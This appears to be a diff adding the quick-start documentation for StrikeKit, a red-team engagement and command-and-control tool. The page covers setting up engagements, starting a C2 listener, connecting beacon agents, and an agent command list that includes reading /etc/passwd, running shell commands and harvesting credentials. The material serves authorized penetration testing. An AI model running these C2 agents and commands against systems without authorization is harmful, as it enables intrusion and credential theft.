@@ -1,0 +1,270 @@
+---
+title: Quick Start
+description: Launch your first engagement in 5 minutes with StrikeKit
+---
+
+# Quick Start
+
+Get up and running with StrikeKit in just a few minutes. This guide will walk you through starting the connector, creating your first engagement, and running basic C2 operations.
+
+## Starting StrikeKit
+
+### Development Mode (Recommended)
+
+The easiest way to start StrikeKit is using the development mode with hot-reloading:
+
+```bash
+just dev
+```
+
+This launches the connector with:
+- Hot-reloading enabled (edit Rust code and see changes instantly)
+- Headless liveview server
+- Matrix integration for collaborative access
+- Default port: 3030
+
+You should see output similar to:
+
+```
+[INFO] Starting StrikeKit connector...
+[INFO] Liveview server listening on http://0.0.0.0:3030
+[INFO] Connected to Matrix gateway
+```
+
+### Custom Configuration
+
+You can customize the port and Matrix host:
+
+```bash
+# Custom port
+just dev PORT=3040
+
+# Custom Matrix host
+just dev HOST=my-matrix-host.example.com
+
+# Both custom
+just dev PORT=3040 HOST=my-matrix-host.example.com
+```
+
+### Manual Start
+
+If you prefer to run without Just:
+
+```bash
+STRIKE48_ACCEPT_INVALID_CERTS=true \
+RUST_LOG=info \
+INSTANCE_ID=strikekit-connector-1 \
+MATRIX_HOST=connectors-studio.strike48.test \
+MATRIX_API_URL=https://studio.strike48.test \
+MATRIX_TENANT_ID=non-prod \
+SK_PORT=3033 \
+cargo run --bin sk-connector --features connector --no-default-features
+```
+
+## Creating Your First Engagement
+
+![Engagement Wizard](/img/strikekit/screenshots/wizard-basic-info.png)
+
+### Step 1: Start the Wizard
+
+1. Access StrikeKit through your Matrix interface or local browser
+2. Navigate to the dashboard
+3. Click **Create New Engagement**
+
+### Step 2: Basic Information
+
+![Basic Info](/img/strikekit/screenshots/wizard-basic-info.png)
+
+Fill in the engagement details:
+- **Name**: e.g., "Acme Corp External Assessment"
+- **Client**: Organization name
+- **Type**: External, Internal, Web App, or AD Assessment
+- **Start Date**: Engagement start
+- **End Date**: Engagement completion deadline
+
+### Step 3: Define Objectives
+
+![Objectives](/img/strikekit/screenshots/wizard-objectives.png)
+
+Set clear objectives for the engagement:
+- Test perimeter defenses
+- Validate detection capabilities
+- Assess Active Directory security
+- Evaluate web application security
+
+### Step 4: Define Scope
+
+![Scope](/img/strikekit/screenshots/wizard-scope.png)
+
+Specify what's in scope:
+- IP ranges (e.g., `192.168.1.0/24`)
+- Domain names
+- Specific hosts
+- Applications
+
+### Step 5: Rules of Engagement
+
+![Rules of Engagement](/img/strikekit/screenshots/wizard-rules-of-engagement.png)
+
+Define operational constraints:
+- Testing hours
+- Excluded systems
+- Contact information
+- Escalation procedures
+
+### Step 6: Activate
+
+Click **Create Engagement** to finalize. Your engagement is now in **Planning** status.
+
+## Setting Up C2 Operations
+
+### Starting the Listener
+
+1. Navigate to **C2 Management**
+2. Configure listener settings:
+   - **Host**: `0.0.0.0` (listen on all interfaces)
+   - **Port**: `8443` (default)
+   - **Sleep Interval**: `5` seconds
+   - **Jitter**: `10` percent
+3. Click **Start Listener**
+
+The listener will start on `0.0.0.0:8443` and wait for agent connections.
+
+### Connecting an Agent
+
+In a separate terminal, run the agent:
+
+```bash
+# Connect to default localhost:8443
+cargo run -p sk-agent
+
+# Connect to specific server
+cargo run -p sk-agent -- --server http://192.168.1.100:8443
+
+# With custom sleep and jitter
+cargo run -p sk-agent -- --server http://192.168.1.100:8443 --sleep 30 --jitter 20
+```
+
+Agent options:
+- `--server, -s <URL>` - C2 server URL (default: `http://127.0.0.1:8443`)
+- `--sleep <SECONDS>` - Beacon interval (default: 5)
+- `--jitter <PERCENT>` - Random jitter percentage (default: 10)
+
+### Running Commands
+
+![C2 Operations](/img/strikekit/screenshots/operations.png)
+
+Once the agent connects, you can issue commands:
+
+```bash
+# System information
+sysinfo
+
+# List directory
+ls /tmp
+
+# Execute shell command
+shell whoami
+
+# Get current directory
+pwd
+
+# Change directory
+cd /etc
+
+# List processes
+ps
+
+# Download file
+download /etc/passwd
+
+# Upload file
+upload /local/file.txt
+
+# Screenshot
+screenshot
+
+# Adjust beacon interval
+sleep 30
+
+# Terminate agent
+exit
+```
+
+### Auto-Extraction
+
+StrikeKit automatically extracts valuable information from command output:
+
+- **Targets**: IP addresses, hostnames, domains
+- **Credentials**: Passwords, hashes, API keys
+- **Findings**: Vulnerabilities, misconfigurations
+
+This data is automatically added to your engagement database.
+
+## Tracking Activity
+
+### Activity Timeline
+
+![Activity Timeline](/img/strikekit/screenshots/activity-timeline.png)
+
+View all operations in chronological order:
+- Commands executed
+- Files transferred
+- Targets discovered
+- Credentials found
+
+### Findings Documentation
+
+![Findings](/img/strikekit/screenshots/findings-expanded.png)
+
+Document vulnerabilities as you discover them:
+- Severity rating
+- MITRE ATT&CK techniques
+- Evidence and screenshots
+- Remediation recommendations
+
+### Pivot Tracking
+
+![Pivot Chain](/img/strikekit/screenshots/pivot-chain.png)
+
+Track your attack path:
+- Document lateral movement
+- Record blockers
+- Map kill chains
+- Visualize infrastructure
+
+## Generating Reports
+
+When your engagement is complete:
+
+1. Navigate to **Findings**
+2. Click **Export to PDF**
+3. Professional report is generated with:
+   - Executive summary
+   - Technical findings
+   - Evidence screenshots
+   - Recommendations
+
+## Next Steps
+
+Now that you've completed your first engagement:
+
+- [Configuration Guide](./configuration.md) - Customize environment variables and settings
+
+## Common Commands Reference
+
+```bash
+# Development
+just dev              # Start with hot-reload
+just run              # Start without hot-reload
+just build            # Build release binary
+just check            # Quick syntax check
+
+# Testing
+just test             # Run all tests
+just fmt              # Format code
+just lint             # Run clippy
+
+# Information
+just info             # Show version and config
+```
